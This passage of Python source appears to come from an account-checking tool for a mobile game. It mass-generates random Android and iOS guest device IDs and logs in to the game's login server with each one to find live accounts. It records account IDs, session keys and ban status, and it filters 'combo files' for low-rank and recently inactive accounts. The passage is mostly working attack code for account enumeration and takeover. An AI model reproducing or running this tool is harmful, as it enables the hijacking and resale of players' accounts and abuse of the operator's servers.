    p(f" {gtitle(f'{c(WHITE)}{BD}BAN CHECK ONLY (SINGLE){W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Lightweight check - only fetches ban status.{W}')}")
    p(f" {grow(f'{c(GRAY)}No player info / no game server. Fast.{W}')}")
    p(f' {gbot()}')
    p('')
    
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Enter a single Device ID to check ban status.{W}')}")
    p(f' {gbot()}')
    p('')
    
    device_id = input(f' {c(CYAN)}Device ID (0 = Back)>{W} ').strip()
    if not device_id or device_id in ('0', 'q', 'exit', 'back'):
        return
    
    p(f'\n {c(GRAY)}[*] Checking ban status...{W}\n')
    
    start_t = time.time()
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            ban_result = loop.run_until_complete(check_ban_v2_async(device_id))
        finally:
            loop.close()
    except Exception as e:
        p(f' {c(RED)}Error: {e}{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    elapsed = time.time() - start_t
    
    if not ban_result:
        p(f' {c(RED)}Ban check failed. Could not connect to login server.{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    status = ban_result.get('status', 'UNKNOWN')
    acc = ban_result.get('account_id')
    zone = ban_result.get('zone_id')
    err = ban_result.get('error')
    
    if status == 'BANNED':
        status_color = RED
        status_text = "BANNED"
        status_emoji = "[X]"
    elif status == 'NOT BANNED':
        status_color = GREEN
        status_text = "CLEAN / NOT BANNED"
        status_emoji = "[OK]"
    else:
        status_color = GOLD
        status_text = "UNKNOWN"
        status_emoji = "[?]"
    
    acc_str = str(acc) if acc else "N/A"
    zone_str = str(zone) if zone else "N/A"
    elapsed_str = f"{elapsed:.2f}s"
    
    p(f' {gtop(V1, V2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}BAN CHECK RESULT{W}', V1, V2)}")
    p(f' {gmid(V1, V2)}')
    p(f" {grow(f'{c(GRAY)}Device ID{W}     {c(GOLD)}{device_id}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Account{W}       {c(WHITE)}{acc_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Zone{W}          {c(WHITE)}{zone_str}{W}', V1, V2)}")
    p(f' {gdash(V1, V2)}')
    p(f" {grow(f'{c(GRAY)}Ban Status{W}    {c(status_color)}{BD}{status_emoji} {status_text}{W}', V1, V2)}")
    
    if status == 'BANNED':
        ban_code = str(ban_result.get('ban_code', 'N/A'))
        reason = str(ban_result.get('reason', 'N/A'))
        duration = str(ban_result.get('duration', 'N/A'))
        p(f" {grow(f'{c(GRAY)}Ban Code{W}      {c(RED)}{ban_code}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Reason{W}        {c(RED)}{reason}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Duration{W}      {c(RED)}{duration}{W}', V1, V2)}")
    elif err:
        p(f" {grow(f'{c(GRAY)}Note{W}          {c(GOLD)}{err}{W}', V1, V2)}")
    
    p(f' {gdash(V1, V2)}')
    p(f" {grow(f'{c(GRAY)}Check Time{W}    {c(WHITE)}{elapsed_str}{W}', V1, V2)}")
    p(f' {gbot(V1, V2)}')
    p('')
    
    os.makedirs(RESULTS_DIR, exist_ok=True)
    try:
        if status == 'BANNED':
            out_file = os.path.join(RESULTS_DIR, 'ban_check_single_banned.txt')
            line = f"DevID: {device_id} | Account: {acc_str} | Zone: {zone_str} | STATUS: BANNED | Code: {ban_result.get('ban_code', 'N/A')} | Reason: {ban_result.get('reason', 'N/A')} | Duration: {ban_result.get('duration', 'N/A')}"
        elif status == 'NOT BANNED':
            out_file = os.path.join(RESULTS_DIR, 'ban_check_single_clean.txt')
            line = f"DevID: {device_id} | Account: {acc_str} | Zone: {zone_str} | STATUS: CLEAN"
        else:
            out_file = os.path.join(RESULTS_DIR, 'ban_check_single_unknown.txt')
            line = f"DevID: {device_id} | Account: {acc_str} | Zone: {zone_str} | STATUS: UNKNOWN | Note: {err or 'N/A'}"
        
        with open(out_file, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
        p(f' {c(GREEN)}Saved to:{W} {c(GRAY)}{out_file}{W}')
    except Exception:
        pass
    
    p('')
    input(f' {c(CYAN)}Press Enter to continue...{W}')

def _random_hex(n: int) -> str:
    return ''.join(random.choices(HEX_CHARS, k=n))


def _random_alnum_lower(n: int) -> str:
    return ''.join(random.choices(ALNUM_LOWER, k=n))


def gen_and_device(cycle: int) -> str:
    part1 = _random_hex(32)
    part2 = _random_alnum_lower(24)
    tail1 = _random_hex(4)
    tail2 = _random_hex(4)
    tail3 = _random_hex(4)
    tail4 = _random_hex(12)
    return f"and_{part1}{part2}-{tail1}-{tail2}-{tail3}-{tail4}\n"


def gen_ios_device(cycle: int) -> str:
    return f"ios_{str(uuid.uuid4()).upper()}\n"


def _generate_worker(cycle_start: int, count: int, gen_idx_start: int, queue: Queue, generators: list):
    fmt_count = len(generators)
    cycle = cycle_start
    idx = gen_idx_start
    for _ in range(count):
        idx = (idx + 1) % fmt_count
        queue.put(generators[idx](cycle))
        cycle += 1


def _writer_thread(queue: Queue, output_file: str):
    buffer = []
    buffer_size = 0
    with open(output_file, "a", encoding="utf-8", buffering=8 * 1024 * 1024) as f:
        while True:
            item = queue.get()
            if item is None:
                break
            buffer.append(item)
            buffer_size += len(item)
            if buffer_size >= 8 * 1024 * 1024:
                f.write(''.join(buffer))
                buffer.clear()
                buffer_size = 0
        if buffer:
            f.write(''.join(buffer))


def _run_generator(target_lines: int, output_file: str, generators: list, threads: int = GEN_THREADS):
    if os.path.exists(output_file):
        os.remove(output_file)

    queue = Queue(maxsize=200000)
    writer = threading.Thread(target=_writer_thread, args=(queue, output_file))
    writer.start()

    executor = ThreadPoolExecutor(max_workers=threads)
    tasks = []
    fmt_count = len(generators)
    lines_left = target_lines
    cycle, idx = 1, 0

    while lines_left > 0:
        take = min(GEN_CHUNK_SIZE, lines_left)
        tasks.append(executor.submit(_generate_worker, cycle, take, idx, queue, generators))
        idx += take
        cycle += idx // fmt_count
        idx %= fmt_count
        lines_left -= take

    for future in tasks:
        future.result()

    queue.put(None)
    writer.join()
    executor.shutdown()


def run_generator_menu():
    clear()
    print_banner()
    
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}GENERATE DEVICE IDS{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Saving directory:{W} {c(GOLD)}{BASE_DIR}{W}')}")
    p(f' {gbot()}')
    p('')
    
    p(f' {gtop(V1, V2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}AVAILABLE FORMATS{W}', V1, V2)}")
    p(f' {gmid(V1, V2)}')
    p(f" {grow(f'{c(GREEN)}and_ {W}: and_<32hex><24alnum>-<4hex>-<4hex>-<4hex>-<12hex>', V1, V2)}")
    p(f" {grow(f'{c(GREEN)}ios_ {W}: ios_<UUID uppercase>', V1, V2)}")
    p(f' {gbot(V1, V2)}')
    p('')
    
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}How many lines? (ex: 100000, 1k, 1m):{W}')}")
    p(f' {gbot()}')
    raw = input(f' {c(CYAN)}>{W} ').strip()
    
    try:
        if raw.lower().endswith("k"):
            target_lines = int(float(raw[:-1]) * 1_000)
        elif raw.lower().endswith("m"):
            target_lines = int(float(raw[:-1]) * 1_000_000)
        else:
            target_lines = int(raw)
    except ValueError:
        p(f' {c(RED)}Invalid number, using default 1,000,000{W}')
        target_lines = 1_000_000
    
    if target_lines <= 0:
        p(f' {c(RED)}Must be greater than 0{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    p('')
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}GENERATION TYPE{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GOLD)}[1]{W} and_ only', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[2]{W} ios_ only', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[3]{W} Both (and_ + ios_ mixed 50/50)', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[0]{W} Cancel', V1, V2)}")
    p(f' {gbot()}')
    p('')
    
    choice = input(f' {c(CYAN)}Choose (0-3)>{W} ').strip()
    
    if choice == '0':
        return
    
    if choice == '1':
        generators = [gen_and_device]
        output_file = OUTPUT_FILE_AND
        label = "and_ ONLY"
    elif choice == '2':
        generators = [gen_ios_device]
        output_file = OUTPUT_FILE_IOS
        label = "ios_ ONLY"
    elif choice == '3':
        generators = [gen_and_device, gen_ios_device]
        output_file = OUTPUT_FILE_BOTH
        label = "and_ + ios_ (50/50)"
    else:
        p(f' {c(RED)}Invalid choice.{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    p('')
    p(f' {c(GRAY)}Generating {c(WHITE)}{target_lines:,}{c(GRAY)} lines ({label}) with {GEN_THREADS} threads...{W}')
    p(f' {c(GRAY)}Saving to: {c(GOLD)}{output_file}{W}\n')
    
    t0 = time.time()
    _run_generator(target_lines, output_file, generators)
    elapsed = time.time() - t0
    
    if os.path.exists(output_file):
        file_size = os.path.getsize(output_file)
        with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
            actual_lines = sum(1 for _ in f)
        speed = target_lines / elapsed if elapsed > 0 else 0
        
        file_size_mb = file_size / (1024 * 1024)
        size_str = f"{file_size_mb:.2f} MB ({file_size:,} bytes)"
        lines_str = f"{actual_lines:,}"
        elapsed_str = f"{elapsed:.2f}s"
        speed_str = f"{speed:,.0f} lines/s"
        
        p(f' {gtop(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}GENERATION COMPLETE{W}', V1, V2)}")
        p(f' {gmid(V1, V2)}')
        p(f" {grow(f'{c(GRAY)}File{W}   {c(GOLD)}{output_file}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Lines{W}  {c(GREEN)}{lines_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Size{W}   {c(CYAN)}{size_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Time{W}   {c(CYAN)}{elapsed_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Speed{W}  {c(GREEN)}{speed_str}{W}', V1, V2)}")
        p(f' {gbot(V1, V2)}')
        
        p('')
        p(f' {c(GRAY)}Sample (first 3 lines):{W}')
        with open(output_file, 'r', encoding='utf-8') as f:
            for i, line in enumerate(f):
                if i >= 3:
                    break
                p(f'   {c(CYAN)}{line.strip()}{W}')
    else:
        p(f' {c(RED)}File was not created!{W}')
    
    p('')
    input(f' {c(CYAN)}Press Enter to continue...{W}')

def _parse_accounts(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()
    blocks = re.split(r'\n(?=Account:\s*\d+)', content.strip())
    accounts = []
    for block in blocks:
        block = block.strip()
        if not block.startswith('Account:'):
            continue
        accounts.append(block)
    return accounts


def _get_field(block, field):
    m = re.search(rf'{field}:\s*([^|]+)', block)
    return m.group(1).strip() if m else None


def _get_rank(block):
    m = re.search(r'(?<!Highest )\bRank:\s*([^|]+)', block)
    return m.group(1).strip() if m else None


def _is_warrior_or_elite(rank):
    if not rank:
        return False
    rl = rank.lower()
    if re.match(r'^warrior\b', rl):
        return True
    if re.match(r'^elite\b', rl):
        return True
    return False


def _parse_last_login(login_str):
    login_str = login_str.strip().lower()
    total_days = 0.0
    m = re.search(r'(\d+)\s*d', login_str)
    if m:
        total_days += int(m.group(1))
    m = re.search(r'(\d+)\s*h', login_str)
    if m:
        total_days += int(m.group(1)) / 24.0
    m = re.search(r'(\d+)\s*m', login_str)
    if m:
        total_days += int(m.group(1)) / 1440.0
    return total_days


def _get_last_login(block):
    m = re.search(r'Last Login:\s*([^|]+)', block)
    return m.group(1).strip() if m else None


def run_separate_warrior_elite():

    clear()
    print_banner()
    
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}SEPARATE WARRIOR / ELITE ACCOUNTS{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Filters accounts by rank (Warrior or Elite only).{W}')}")
    p(f' {gbot()}')
    p('')
    
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Combo file path (0 = Back):{W}')}")
    p(f' {gbot()}')
    input_file = input(f' {c(CYAN)}>{W} ').strip().strip('"').strip("'")
    
    if not input_file or input_file == '0':
        return
    
    if not os.path.isfile(input_file):
        p(f' {c(RED)}File not found: {input_file}{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}How many do you want to separate:{W}')}")
    p(f' {gbot()}')
    while True:
        limit_input = input(f' {c(CYAN)}>{W} ').strip()
        try:
            limit = int(limit_input)
            if limit <= 0:
                p(f' {c(RED)}Please enter a number greater than 0.{W}')
                continue
            break
        except ValueError:
            p(f' {c(RED)}Invalid input. Please enter a valid number.{W}')
    
    base_dir = os.path.dirname(os.path.abspath(input_file))
    output_file = os.path.join(base_dir, 'warrior_elite_accounts.txt')
    
    accounts = _parse_accounts(input_file)
    p('')
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Total accounts parsed:{W} {c(WHITE)}{len(accounts):,}{W}')}")
    p(f' {gbot()}')
    p('')
    
    filtered = []
    for block in accounts:
        rank = _get_rank(block)
        if _is_warrior_or_elite(rank):
            filtered.append(block)
    
    total_matched = len(filtered)
    
    if limit < total_matched:
        filtered = filtered[:limit]
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("=" * 80 + "\n")
        f.write("WARRIOR / ELITE RANK ACCOUNTS\n")
        f.write("=" * 80 + "\n")
        f.write(f"Total accounts scanned  : {len(accounts)}\n")
        f.write(f"Total accounts matched  : {total_matched}\n")
        f.write(f"Accounts written        : {len(filtered)}\n")
        f.write(f"Requested limit         : {limit}\n")
        f.write("=" * 80 + "\n\n")
        for i, block in enumerate(filtered, 1):
            rank = _get_rank(block)
            f.write(f"[#{i}] Rank: {rank}\n")
            f.write(block + "\n")
            f.write("\n" + "-" * 80 + "\n\n")
    
    scanned_str = f"{len(accounts):,}"
    matched_str = f"{total_matched:,}"
    written_str = f"{len(filtered):,}"
    
    p(f' {gtop(V1, V2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}SEPARATION COMPLETE{W}', V1, V2)}")
    p(f' {gmid(V1, V2)}')
    p(f" {grow(f'{c(GRAY)}Total scanned{W}   {c(WHITE)}{scanned_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Total matched{W}   {c(GREEN)}{matched_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Written{W}         {c(GOLD)}{written_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Output{W}          {c(GOLD)}{output_file}{W}', V1, V2)}")
    p(f' {gbot(V1, V2)}')
    p('')
    
    input(f' {c(CYAN)}Press Enter to continue...{W}')


def run_separate_inactive():

    clear()
    print_banner()
    
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}SEPARATE INACTIVE ACCOUNTS{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Filters accounts by Last Login between 15 and 40 days.{W}')}")
    p(f' {gbot()}')
    p('')
    
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Combo file path (0 = Back):{W}')}")
    p(f' {gbot()}')
    input_file = input(f' {c(CYAN)}>{W} ').strip().strip('"').strip("'")
    
    if not input_file or input_file == '0':
        return
    
    if not os.path.isfile(input_file):
        p(f' {c(RED)}File not found: {input_file}{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}How many do you want to separate:{W}')}")
    p(f' {gbot()}')
    while True:
        limit_input = input(f' {c(CYAN)}>{W} ').strip()
        try:
            limit = int(limit_input)
            if limit <= 0:
                p(f' {c(RED)}Please enter a number greater than 0.{W}')
                continue
            break
        except ValueError:
            p(f' {c(RED)}Invalid input. Please enter a valid number.{W}')
    
    base_dir = os.path.dirname(os.path.abspath(input_file))
    output_file = os.path.join(base_dir, 'last_login_15d_to_40d.txt')
    
    accounts = _parse_accounts(input_file)
    p('')
    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Total accounts parsed:{W} {c(WHITE)}{len(accounts):,}{W}')}")
    p(f' {gbot()}')
    p('')
    
    filtered = []
    for block in accounts:
        login_str = _get_last_login(block)
        if not login_str:
            continue
        days = _parse_last_login(login_str)
        if 15 <= days <= 40:
            filtered.append((days, block))
    
    filtered.sort(key=lambda x: x[0])
    
    total_matched = len(filtered)
    if limit < total_matched:
        filtered = filtered[:limit]
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("=" * 80 + "\n")
        f.write("ACCOUNTS WITH LAST LOGIN BETWEEN 15 AND 40 DAYS\n")
        f.write("=" * 80 + "\n")
        f.write(f"Total accounts scanned  : {len(accounts)}\n")
        f.write(f"Total accounts matched  : {total_matched}\n")
        f.write(f"Accounts written        : {len(filtered)}\n")
        f.write(f"Requested limit         : {limit}\n")
        f.write("=" * 80 + "\n\n")
        for i, (days, block) in enumerate(filtered, 1):
            f.write(f"[#{i}] ~{days:.2f} days ago\n")
            f.write(block + "\n")
            f.write(f">>> Computed Last Login: ~{days:.2f} days\n")
            f.write("\n" + "-" * 80 + "\n\n")
    
    scanned_str = f"{len(accounts):,}"
    matched_str = f"{total_matched:,}"
    written_str = f"{len(filtered):,}"
    
    p(f' {gtop(V1, V2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}SEPARATION COMPLETE{W}', V1, V2)}")
    p(f' {gmid(V1, V2)}')
    p(f" {grow(f'{c(GRAY)}Total scanned{W}   {c(WHITE)}{scanned_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Total matched{W}   {c(GREEN)}{matched_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Written{W}         {c(GOLD)}{written_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Output{W}          {c(GOLD)}{output_file}{W}', V1, V2)}")
    p(f' {gbot(V1, V2)}')
    p('')
    
    input(f' {c(CYAN)}Press Enter to continue...{W}')


def run_separate_menu():

    while True:
        clear()
        print_banner()
        
        p(f' {gtop(A1, A2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}SEPARATE ACCOUNTS{W}', A1, A2)}")
        p(f' {gmid(A1, A2)}')
        p(f" {grow(f'{c(GOLD)}[1]{W} {c(WHITE)}Warrior / Elite{W}   {c(GRAY)}Separate low-rank accounts{W}', A1, A2)}")
        p(f" {grow(f'{c(GOLD)}[2]{W} {c(WHITE)}Inactive{W}          {c(GRAY)}Last login 15-40 days ago{W}', A1, A2)}")
        p(f" {grow(f'{c(GOLD)}[0]{W} {c(WHITE)}Back{W}', A1, A2)}")
        p(f' {gbot(A1, A2)}')
        p('')
        
        choice = input(f' {c(CYAN)}Choose (0-2)>{W} ').strip()
        
        if choice == '0':
            return
        elif choice == '1':
            run_separate_warrior_elite()
        elif choice == '2':
            run_separate_inactive()
        else:
            p(f' {c(RED)}Invalid choice.{W}')
            time.sleep(1)

class LiveDashboard:
    def __init__(self, total, concurrency, rate):
        self.total = total
        self.concurrency = concurrency
        self.rate = rate
        self.checked = 0
        self.valid = 0
        self.no_info = 0
        self.unreg = 0
        self.start_time = time.monotonic()
        self.tier_counts = {name: 0 for _, _, name in COLLECTOR_TIERS}
        self.tier_counts["No Tier"] = 0
        self.skin_counts = []
        self.ban_stats = {"checked": 0, "banned": 0, "clean": 0, "unknown": 0}
        self._lock = threading.Lock()
        self._stop = False
        self._thread = None
        self._lines = 0

    def add_result(self, res):
        with self._lock:
            self.checked += 1
            player = res.get('player')
            ban_info = res.get('ban_info', {})
            self.ban_stats["checked"] += 1
            status = ban_info.get('status', 'UNKNOWN')
            if status == 'BANNED':
                self.ban_stats["banned"] += 1
            elif status == 'NOT BANNED':
                self.ban_stats["clean"] += 1
            else:
                self.ban_stats["unknown"] += 1
            if not player:
                self.no_info += 1
                return
            self.valid += 1
            base = collector_base_tier(player.get('collector_tier', 'No Tier'))
            self.tier_counts[base] = self.tier_counts.get(base, 0) + 1
            self.skin_counts.append(int(player.get('skin_count', 0) or 0))

    def add_unreg(self):
        with self._lock:
            self.checked += 1
            self.unreg += 1

    def snapshot(self):
        with self._lock:
            return {
                'checked': self.checked,
                'valid': self.valid,
                'no_info': self.no_info,
                'unreg': self.unreg,
                'tiers': dict(self.tier_counts),
                'skins': sorted(self.skin_counts),
                'elapsed': time.monotonic() - self.start_time,
                'ban_stats': dict(self.ban_stats),
            }

    def _build_lines(self):
        s = self.snapshot()
        elapsed = s['elapsed']
        speed = s['checked'] / elapsed if elapsed > 0 else 0
        progress = (s['checked'] / self.total * 100) if self.total > 0 else 0
        eta = (self.total - s['checked']) / speed if speed > 0 else 0
        bar_len = 20
        filled = int(progress / 100 * bar_len)
        bar = gradient_text('#' * filled, CYAN, PURPLE) + f"{c(GRAY)}{'.' * (bar_len - filled)}{W}"

        checked_str = f"{s['checked']:,}"
        total_str = f"{self.total:,}"
        valid_str = f"{s['valid']:,}"
        no_info_str = f"{s['no_info']:,}"
        unreg_str = f"{s['unreg']:,}"
        bs = s['ban_stats']
        bs_checked = f"{bs['checked']:,}"
        bs_banned = f"{bs['banned']:,}"
        bs_clean = f"{bs['clean']:,}"
        bs_unknown = f"{bs['unknown']:,}"

        lines = []
        lines.append(f' {gtop()}')
        lines.append(f" {gtitle(f'{c(WHITE)}{BD}LIVE DASHBOARD{W}', A1, A2)}")
        lines.append(f' {gmid()}')
        lines.append(f" {grow(f'{c(GRAY)}Progress{W}  {bar} {c(WHITE)}{progress:.0f}%{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}Checked{W}   {c(WHITE)}{checked_str}{W} / {c(WHITE)}{total_str}{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}Speed{W}     {c(TEAL)}{speed:.1f} id/s{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}Elapsed{W}   {c(WHITE)}{fmt_dur(elapsed)}{W}', A1, A2)}")
        lines.append(f" {grow(f'{c(GRAY)}ETA{W}       {c(WHITE)}{fmt_dur(eta)}{W}', A1, A2)}")
        lines.append(f' {gdash()}')
        lines.append(f" {grow(f'{c(GREEN)}Valid{W}      {c(WHITE)}{BD}{valid_str}{W}', H1, H2)}")
        lines.append(f" {grow(f'{c(GOLD)}No Info{W}    {c(WHITE)}{no_info_str}{W}', H1, H2)}")
        lines.append(f" {grow(f'{c(RED)}Unreg{W}      {c(WHITE)}{unreg_str}{W}', H1, H2)}")
        lines.append(f' {gdash()}')
        lines.append(f" {gtitle(f'{c(WHITE)}{BD}BAN STATUS (Ban V2){W}', V1, V2)}")
        lines.append(f" {grow(f'{c(GRAY)}Checked{W}   {c(WHITE)}{bs_checked}{W}', V1, V2)}")
        lines.append(f" {grow(f'{c(RED)}BANNED{W}     {c(WHITE)}{BD}{bs_banned}{W}', V1, V2)}")
        lines.append(f" {grow(f'{c(GREEN)}CLEAN{W}     {c(WHITE)}{bs_clean}{W}', V1, V2)}")
        lines.append(f" {grow(f'{c(GOLD)}Unknown{W}   {c(WHITE)}{bs_unknown}{W}', V1, V2)}")
        lines.append(f' {gdash()}')
        lines.append(f" {gtitle(f'{c(WHITE)}{BD}COLLECTOR TIERS{W}', V1, V2)}")
        order = ["Renowned Collector", "Exalted Collector", "World Collector",
                 "Mega Collector", "Expert Collector", "Seasoned Collector",
                 "Junior Collector", "Amateur Collector", "No Tier"]
        for tier in order:
            cnt = s['tiers'].get(tier, 0)
            cnt_str = f"{cnt:,}"
            if tier == "Renowned Collector":
                label = f"{c(GOLD)}* {tier}{W}"
            else:
                label = f"{c(WHITE)}{tier}{W}"
            lines.append(f" {grow(f'{label}  {c(WHITE)}{cnt_str}{W}', V1, V2)}")
        lines.append(f' {gdash()}')
        lines.append(f" {gtitle(f'{c(WHITE)}{BD}SKIN COUNTS (lowest -> highest){W}', V1, V2)}")
        for row in skin_rows(s['skins']):
            lines.append(f" {grow(f'{c(CYAN)}{row}{W}', V1, V2)}")
        lines.append(f' {gbot()}')
        return lines

    def render(self):
        lines = self._build_lines()
        self._lines = len(lines)
        for ln in lines:
            p(ln)

    def refresh(self):
        if self._lines > 0:
            sys.stdout.write(f'\x1b[{self._lines}A')
            sys.stdout.flush()
        self.render()

    def _loop(self):
        while not self._stop:
            time.sleep(1)
            if self._stop:
                break
            self.refresh()

    def start(self):
        self.render()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop = True
        if self._thread:
            self._thread.join(timeout=2)

    def render_summary(self):
        s = self.snapshot()
        elapsed = s['elapsed']
        speed = s['checked'] / elapsed if elapsed > 0 else 0
        valid_str = f"{s['valid']:,}"
        no_info_str = f"{s['no_info']:,}"
        unreg_str = f"{s['unreg']:,}"
        checked_str = f"{s['checked']:,}"
        bs = s['ban_stats']
        bs_banned = f"{bs['banned']:,}"
        bs_clean = f"{bs['clean']:,}"
        bs_unknown = f"{bs['unknown']:,}"

        p('')
        p(f' {gtop(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}DASHBOARD SUMMARY{W}', V1, V2)}")
        p(f' {gmid(V1, V2)}')
        p(f" {grow(f'{c(GREEN)}Valid{W}      {c(WHITE)}{BD}{valid_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(GOLD)}No Info{W}    {c(WHITE)}{no_info_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(RED)}Unreg{W}      {c(WHITE)}{unreg_str}{W}', V1, V2)}")
        p(f' {gdash(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}BAN SUMMARY{W}', V1, V2)}")
        p(f" {grow(f'{c(RED)}BANNED{W}     {c(WHITE)}{BD}{bs_banned}{W}', V1, V2)}")
        p(f" {grow(f'{c(GREEN)}CLEAN{W}     {c(WHITE)}{bs_clean}{W}', V1, V2)}")
        p(f" {grow(f'{c(GOLD)}Unknown{W}   {c(WHITE)}{bs_unknown}{W}', V1, V2)}")
        p(f' {gdash(V1, V2)}')
        p(f" {grow(f'{c(GRAY)}Total{W}      {c(WHITE)}{checked_str}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Time{W}       {c(WHITE)}{fmt_dur(elapsed)}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Speed{W}      {c(WHITE)}{speed:.1f} id/s{W}', V1, V2)}")
        p(f' {gdash(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}COLLECTOR TIERS{W}', V1, V2)}")
        order = ["Renowned Collector", "Exalted Collector", "World Collector",
                 "Mega Collector", "Expert Collector", "Seasoned Collector",
                 "Junior Collector", "Amateur Collector", "No Tier"]
        for tier in order:
            cnt = s['tiers'].get(tier, 0)
            cnt_str = f"{cnt:,}"
            if tier == "Renowned Collector":
                label = f"{c(GOLD)}* {tier}{W}"
            else:
                label = f"{c(WHITE)}{tier}{W}"
            p(f" {grow(f'{label}  {c(WHITE)}{cnt_str}{W}', V1, V2)}")
        p(f' {gdash(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}SKIN COUNTS{W}', V1, V2)}")
        skins = s['skins']
        if skins:
            if len(skins) <= 24:
                shown = ', '.join(str(x) for x in skins)
            else:
                low = ', '.join(str(x) for x in skins[:12])
                high = ', '.join(str(x) for x in skins[-12:])
                shown = f"{low} ... {high}"
            p(f" {grow(f'{c(CYAN)}{shown}{W}', V1, V2)}")
        else:
            p(f" {grow(f'{c(GRAY)}No valid hits{W}', V1, V2)}")
        p(f' {gdash(V1, V2)}')
        p(f" {grow(f'{c(GREEN)}>{W} {c(GRAY)}results/valid.txt{W}', V1, V2)}")
        p(f" {grow(f'{c(GOLD)}>{W} {c(GRAY)}results/*_collector.txt{W}', V1, V2)}")
        p(f" {grow(f'{c(RED)}>{W} {c(GRAY)}results/banned.txt{W}', V1, V2)}")
        p(f" {grow(f'{c(GREEN)}>{W} {c(GRAY)}results/clean_ban.txt{W}', V1, V2)}")
        p(f' {gbot(V1, V2)}')
        p('')


async def _check_with_ban(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[dict]:
    await bucket.acquire()
    async with sem:
        writer = None
        try:
            frame = _login_frame(did)
            r, w = await asyncio.wait_for(asyncio.open_connection(LOGIN_HOST, LOGIN_PORT), timeout=CONN_TO)
            writer = w
            w.write(frame)
            await asyncio.wait_for(w.drain(), timeout=1.0)
            hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
            flags = int.from_bytes(hdr, 'big')
            size = flags & 16777215
            ct = flags >> 24
            body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
            body = _decode(ct, body)
            outer = SDP(body)
            if outer.get(0) != 2:
                return None
            raw = outer.get(6) or outer.get(5)
            if not isinstance(raw, bytes):
                return None
            inner = SDP(raw)
            acc = inner.get(0)
            if not acc:
                return None
            skey = inner.get(1, '')
            creation_ts = inner.get(19, 0)
            zr = inner.get(2)
            if isinstance(zr, list):
                zones = [z for z in zr if isinstance(z, int)] if zr else [0]
            elif isinstance(zr, dict):
                zones = [zr.get(0, 0)]
            elif isinstance(zr, int):
                zones = [zr]
            else:
                zones = [0]
            zone = zones[0] if zones else 0
            
            account_info = {
                'account_id': acc,
                'session': skey[:20] + '...' if len(skey) > 20 else skey,
                'zone': zone,
                'guid': inner.get(4, 'N/A')
            }
            
            gs_info = await _get_game_server(acc, skey, zone, w, r)
            player_data = None
            ban_info = None
            
